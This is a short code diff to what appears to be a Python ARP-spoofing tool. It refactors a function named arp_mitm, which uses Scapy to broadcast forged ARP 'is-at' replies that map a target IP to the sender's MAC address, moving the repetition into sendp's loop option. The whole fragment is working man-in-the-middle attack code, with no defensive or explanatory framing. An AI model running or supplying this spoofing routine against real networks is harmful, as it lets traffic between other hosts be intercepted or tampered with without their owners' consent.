@@ -24,12 +24,12 @@ def arp_mitm(interface, target, interval=10.0):
 
     my_mac = get_if_hwaddr(interface)
 
-    while 1:
-        sendp(
-            Ether(dst="FF:FF:FF:FF:FF:FF") /
-            ARP(op="is-at", psrc=target, hwsrc=my_mac),
-            inter=interval
-        )
+    sendp(
+        Ether(dst="FF:FF:FF:FF:FF:FF") /
+        ARP(op="is-at", psrc=target, hwsrc=my_mac),
+        inter=interval,
+        loop=True
+    )
 
 
 def get_arg_parser():
